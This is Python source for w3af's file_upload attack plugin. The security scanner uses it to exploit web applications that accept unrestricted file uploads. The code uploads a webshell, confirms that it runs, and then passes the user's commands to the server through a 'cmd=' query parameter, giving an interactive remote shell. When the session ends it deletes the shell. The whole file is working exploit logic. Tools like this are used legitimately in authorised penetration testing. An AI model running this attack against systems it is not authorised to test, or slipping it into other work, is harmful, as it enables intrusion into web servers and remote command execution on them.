"""
file_upload.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import os.path
import tempfile

import w3af.core.controllers.output_manager as om
import w3af.plugins.attack.payloads.shell_handler as shell_handler

from w3af.core.data.kb.exec_shell import ExecShell
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.misc.temp_dir import get_temp_dir
from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
from w3af.core.controllers.misc.io import NamedStringIO
from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug


class file_upload(AttackPlugin):
    """
    Exploit applications that allow unrestricted file uploads inside the webroot.
    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self):
        AttackPlugin.__init__(self)

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_kb_location(self):
        """
        This method should return the vulnerability name (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds an
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        ( attack.os_commanding ) should return 'os_commanding' in this method.
        """
        return ['file_upload',]

    def _generate_shell(self, vuln_obj):
        """
        :param vuln_obj: The vuln to exploit.
        :return: True is a shell object based on the param vuln was created ok.
        """
        # Check if we really can execute commands on the remote server
        if self._verify_vuln(vuln_obj):

            # Set shell parameters
            shell_obj = FileUploadShell(vuln_obj, self._uri_opener,
                                        self.worker_pool, self._exploit)
            return shell_obj
        else:
            return None

    def _verify_vuln(self, vuln_obj):
        """
        This command verifies a vuln. This is really hard work! :P

        :param vuln_obj: The vuln to exploit.
        :return : True if vuln can be exploited.
        """
        # The vuln was saved to the kb as a vuln object
        url = vuln_obj.get_url()
        method = vuln_obj.get_method()
        exploit_dc = vuln_obj.get_dc()

        # Create a file that will be uploaded
        extension = url.get_extension()
        path, file_name = self._create_file(extension)
        file_content = open(os.path.join(path, file_name), "r").read()
        file_handler = NamedStringIO(file_content, file_name)
        
        #   If there are files,
        if 'file_vars' in vuln_obj:
            #
            #   Upload the file
            #
            for file_var_name in vuln_obj['file_vars']:
                # the [0] was added here to support repeated parameter names
                exploit_dc[file_var_name][0] = file_handler
            http_method = getattr(self._uri_opener, method)
            response = http_method(vuln_obj.get_url(), exploit_dc)

            # Call the uploaded script with an empty value in cmd parameter
            # this will return the shell_handler.SHELL_IDENTIFIER if success
            dst = vuln_obj['file_dest']
            self._exploit = dst.get_domain_path().url_join(file_name)
            self._exploit.querystring = u'cmd='
            response = self._uri_opener.GET(self._exploit)

            # Clean-up
            file_handler.close()
            os.remove(os.path.join(path, file_name))

            if shell_handler.SHELL_IDENTIFIER in response.get_body():
                return True

        #   If we got here, there is nothing positive to report
        return False

    def _create_file(self, extension):
        """
        Create a file with a webshell as content.

        :return: Name of the file that was created.
        """
        # Get content
        file_content, real_extension = shell_handler.get_webshells(extension,
                                                                   force_extension=True)[0]
        if extension == '':
            extension = real_extension

        # Open target
        temp_dir = get_temp_dir()
        low_level_fd, path_name = tempfile.mkstemp(prefix='w3af_',
                                                   suffix='.' + extension,
                                                   dir=temp_dir)
        file_handler = os.fdopen(low_level_fd, "w+b")

        # Write content to target
        file_handler.write(file_content)
        file_handler.close()

        path, file_name = os.path.split(path_name)
        return path, file_name

    def get_root_probability(self):
        """
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        """
        return 0.8

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits insecure file uploads and returns a shell. It's
        rather simple, using an html form the plugin uploads the corresponding
        webshell (php, asp, etc.) verifies that the shell is working, and if
        everything is working as expected the user can start typing commands.

        No configurable parameters exist.
        """


class FileUploadShell(ExecShell):

    def __init__(self, vuln, uri_opener, worker_pool, exploit_url):
        super(FileUploadShell, self).__init__(vuln, uri_opener, worker_pool)
        
        self._exploit_url = exploit_url
            
    def get_exploit_URL(self):
        return self._exploit_url

    @exec_debug
    def execute(self, command):
        """
        This method is called when a user writes a command in the shell and
        hits enter.

        Before calling this method, the framework calls the generic_user_input
        method from the shell class.

        :param command: The command to handle ( ie. "read", "exec", etc ).
        :return: The result of the command.
        """
        to_send = self.get_exploit_URL()
        to_send.querystring = u'cmd=' + command
        response = self._uri_opener.GET(to_send)
        return shell_handler.extract_result(response.get_body())

    def end(self):
        msg = 'File upload shell is going to delete the webshell that was'\
              ' uploaded before.'
        om.out.debug(msg)
        file_to_del = self.get_exploit_URL().get_file_name()

        try:
            self.unlink(file_to_del)
        except BaseFrameworkException, e:
            msg = 'File upload shell cleanup failed with exception: "%s".'
            om.out.error(msg % e)
        else:
            msg = 'File upload shell cleanup complete; successfully removed'\
                  ' file: "%s".' % file_to_del
            om.out.debug(msg)

    def get_name(self):
        return 'file_upload'
